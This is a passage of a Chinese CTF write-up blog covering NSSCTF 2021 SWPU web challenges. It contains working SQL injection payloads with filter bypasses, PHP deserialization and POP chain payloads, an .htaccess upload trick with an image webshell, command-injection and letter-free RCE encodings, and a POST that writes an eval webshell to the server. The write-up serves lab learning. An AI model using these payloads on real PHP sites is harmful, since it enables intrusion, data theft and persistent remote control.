+<h3 id="方法2：报错注入"><a href="#方法2：报错注入" class="headerlink" title="方法2：报错注入"></a>方法2：报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆库:</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from </span></span><br><span class="line"><span class="string">information_schema.tables where table_schema=database())),1) --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020103650575.png" alt="image-20211020103650575"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">爆表：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from </span></span><br><span class="line"><span class="string">information_schema.columns where table_schema=database() and </span></span><br><span class="line"><span class="string">table_name=&#x27;</span>test_tb<span class="string">&#x27;)),1) --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020103816914.png" alt="image-20211020103816914"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查flag:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select flag from test_tb)),1) --+</span></span><br></pre></td></tr></table></figure>
+
+<p>但是只查到前半段：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020104001147.png" alt="image-20211020104001147"></p>
+<p>update存在位数限制，使用substr()进行截取后半段：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,substr((select flag from test_tb),32,64)),1) --+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020105145308.png" alt="image-20211020105145308"></p>
+<h2 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h2><p>首先是一个非常萌的派蒙，打开是代码审计，一个字，审！</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HaHaHa</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;admin =<span class="string">&quot;user&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;passwd = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;passwd = sha1(<span class="keyword">$this</span>-&gt;passwd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd === <span class="string">&quot;wllm&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No wake up&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Letmeseesee</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$Letmeseesee</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>代码中一共有一个HaHaHa类，其中有admin和passwd两个公共变量，只要执行到__destruct()方法就可以得到flag。</p>
+<p><strong>难点</strong>：<em>绕过__wakeup()方法</em></p>
+<p>这是一个典型的漏洞：<strong>CVE-2016-7124</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020110419589.png" alt="image-20211020110419589"></p>
+<p>只需要对象那个属性的值大于真实属性的个数就OK。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020113038232.png" alt="image-20211020113038232"></p>
+<p>将Object后面的2改成3就可以了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:“HaHaHa”:3:&#123;s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:4:“wllm”;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020114244075.png" alt="image-20211020114244075"></p>
+<p>感谢师傅：<a href="cnblogs.com/luozuomail/p/11105269.html">vscode+phpstudy</a></p>
+<h2 id="easyupload3-0"><a href="#easyupload3-0" class="headerlink" title="easyupload3.0"></a>easyupload3.0</h2><p>这是一道文件上传的题，通过随意注错发现：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020114533834.png" alt="image-20211020114533834"></p>
+<p>中间件是Apache/2.4.7，于是想到题目中title说试试和某些文件配合，使用.htaccess来getshell:</p>
+<p>首先先上传一个.htaccess文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;dc&quot;&gt; </span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个文件是分布式配置文件，只要AllowOverride All就可以执行，执行的内容是<strong>所有上传文件中带有dc的文件均以php文件执行</strong>。（但是我最开始是上传不了的，只能更改后缀匹配，事实上执行内容不仅仅匹配后缀，而是全局匹配。因此<strong>上传的文件有无后缀无所谓</strong>。）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020115421236.png" alt="image-20211020115421236"></p>
+<p>接着上传图片马：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020115524756.png" alt="image-20211020115524756"></p>
+<p>可以验证一下是否执行：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020115605572.png" alt="image-20211020115605572"></p>
+<p>没有显示不可显示就说明成功了！</p>
+<p>然后就该蚁剑上场：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020115736731.png" alt="image-20211020115736731"></p>
+<p>打进来了！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020115812939.png" alt="image-20211020115812939"></p>
+<p>得到flag.</p>
+<h2 id="finalrce"><a href="#finalrce" class="headerlink" title="finalrce"></a>finalrce</h2><p>无回显RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一种：反弹shell</span><br><span class="line">第二种：dnslog外带数据法</span><br><span class="line">第三种：linux将输出结果写入文件</span><br></pre></td></tr></table></figure>
+
+<p>这里过滤了大部分的反弹shell。</p>
+<p>但因为靶机不能连接外网，所以使用方法三。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先生成目录文件：</span><br><span class="line">dir / | tee wllm</span><br><span class="line"></span><br><span class="line">url=l\s / | tee 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020134314206.png" alt="image-20211020134314206"></p>
+<p>访问文件：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020134334766.png" alt="image-20211020134334766"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到flag,使用tac代替cat,但是la被过滤，使用？代替。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=tac /flllll?aaaaaggggggg |tee wllm</span><br><span class="line"></span><br><span class="line">url=tac /flllll\aaaaaaggggggg | tee 2.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020134711256.png" alt="image-20211020134711256"></p>
+<h2 id="hardrce"><a href="#hardrce" class="headerlink" title="hardrce"></a>hardrce</h2><p>大佬博客：<a target="_blank" rel="noopener" href="https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">无字母数字RCE</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">羽师傅</a></p>
+<p>无字母RCE</p>
+<p>不能用^符号，这里用到了取反，因为~没被过滤</p>
+<p>取反一般用到的都是不可见字符，不会触发正则表达式：</p>
+<p>使用套神给的脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;ls&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>((<span class="number">255</span>)-<span class="built_in">ord</span>(s[i]))[<span class="number">2</span>:]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?wllm=phpinfo();</span><br><span class="line">?wllm=~(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020131903079.png" alt="image-20211020131903079"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?wllm=system(ls /)</span><br><span class="line">?wllm=~(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020132145102.png" alt="image-20211020132145102"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?wllm=system(cat /flllllaaaaaaggggggg);</span><br><span class="line">?wllm=~(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020132615630.png" alt="image-20211020132615630"></p>
+<h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$w00m</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这里有三个类，其中能够直接调用的魔术方法只有destruct，拥有该方法的w22m类只有w00m这个<br>变量，但这里pop的魅力就来了，如果让w00m这个变量赋值为一个对象，触发toString的一个方式<br>中就有echo一个对象，于是就让w22m中的w00m这个属性赋值为w33m这个对象，同理通过w33m<br>中的这句$this-&gt;w00m-&gt;{$this-&gt;w22m}()来跳到w44m中的Getflag从而到达控制变量的效果.</p>
+<p>这个题目需要自己多理解！！！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020135740695.png" alt="image-20211020135740695"></p>
+<p><strong>payload</strong>:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020140952410.png" alt="image-20211020140952410"></p>
+<h2 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h2><p>php伪协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?wllm=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020141710802.png" alt="image-20211020141710802"></p>
+<p>经过base64解码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020141917662.png" alt="image-20211020141917662"></p>
+<p>进入目录：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020142126479.png" alt="image-20211020142126479"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_contents（）如何绕过？</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020143137578.png" alt="image-20211020143137578"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020143025964.png" alt="image-20211020143025964"></p>
+<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">?wllm<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_</span></span><br><span class="line"><span class="string">schema.tables/**/where/**/table_schema/**/like/**/database()||&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()/**/having/**/&#x27;</span><span class="number">1</span><span class="string">&#x27;/**/like/**/&#x27;</span><span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020144336863.png" alt="image-20211020144336863"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your Login name:LTLT_flag,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?wllm=</span><br><span class="line">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/database()/**/having/**/&#x27;1&#x27;/**/like/**/&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020144658924.png" alt="image-20211020144658924"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your Login name:id,flag,id,username,</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?wllm=-1&#x27;/**/union/**/select/**/1,database(),flag/**/from/**/LTLT_flag/**/having/**/&#x27;1&#x27;/**/like/**/&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020144847051.png" alt="image-20211020144847051"></p>
+<p>这里由于禁了right,使用mid()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,database(),mid(flag,1,40)/**/from/**/LTLT_flag/**/having/**/&#x27;1&#x27;/**/like/**/&#x27;1</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/union/**/select/**/1,database(),mid(flag,15,40)/**/from/**/LTLT_flag/**/having/**/&#x27;1&#x27;/**/like/**/&#x27;1</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/union/**/select/**/1,database(),mid(flag,25,40)/**/from/**/LTLT_flag/**/having/**/&#x27;1&#x27;/**/like/**/&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NSSCTF&#123;913183bf-4237-46ee-87fc-bf5cea266562&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="babyunser"><a href="#babyunser" class="headerlink" title="babyunser"></a>babyunser</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload/5ad7c2191968b93f121869cd84f4e1b0.txt</span><br><span class="line">file=phar://upload/5ad7c2191968b93f121869cd84f4e1b0.txt&amp;method=write&amp;var=conte</span><br><span class="line">nt&amp;cmd=ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020200909806.png" alt="image-20211020200909806"></p>
+<h2 id="hardrce-3"><a href="#hardrce-3" class="headerlink" title="hardrce_3"></a>hardrce_3</h2><p>这道题使用自增：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#x27;%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020195519887.png" alt="image-20211020195519887"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST：</span><br><span class="line">_=file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_REQUEST[1]);&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020195752015.png" alt="image-20211020195752015"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020200121633.png" alt="image-20211020200121633"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020200154222.png" alt="image-20211020200154222"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/dc-wh/gitee-image/image-20211020200227005.png" alt="image-20211020200227005"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">DC_comics</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://www.dccomics.top/2021/10/13/%E3%80%90NSSCTF%E3%80%912021SWPU-web/">http://www.dccomics.top/2021/10/13/%E3%80%90NSSCTF%E3%80%912021SWPU-web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://www.dccomics.top" target="_blank">The DC_comics's World</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WEB/">WEB</a><a class="post-meta__tags" href="/tags/competition/">competition</a><a class="post-meta__tags" href="/tags/PHP/">PHP</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/SQL/">SQL</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post_share"><div class="social-share" data-image="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/10/15/%E3%80%90BUUCTF%E3%80%91%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019%5DPHP/"><img class="prev-cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【BUUCTF】[极客大挑战 2019]PHP</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/25/%E7%BD%91%E5%88%83%E6%9D%AF2021%E7%AD%BE%E5%88%B0/"><img class="next-cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">网刃杯2021-签到</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/11/11/【RoarCTF 2019】Easy Calc 1/" title="【RoarCTF 2019】Easy Calc 1"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-11</div><div class="title">【RoarCTF 2019】Easy Calc 1</div></div></a></div><div><a href="/2022/03/18/[ACTF2020 新生赛]BackupFile1/" title="【BUUCTF】[ACTF 2020]新生赛 backupfile1"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-18</div><div class="title">【BUUCTF】[ACTF 2020]新生赛 backupfile1</div></div></a></div><div><a href="/2021/10/15/include/" title="【BUUCTF】[ACTF2020 新生赛]Include"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-15</div><div class="title">【BUUCTF】[ACTF2020 新生赛]Include</div></div></a></div><div><a href="/2021/07/28/【AH-training】PHP反序列化/" title="【AH_training】PHP反序列化"><img class="cover" src="https://s.pc.qq.com/tousu/img/20210618/1810122_1623973655.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt 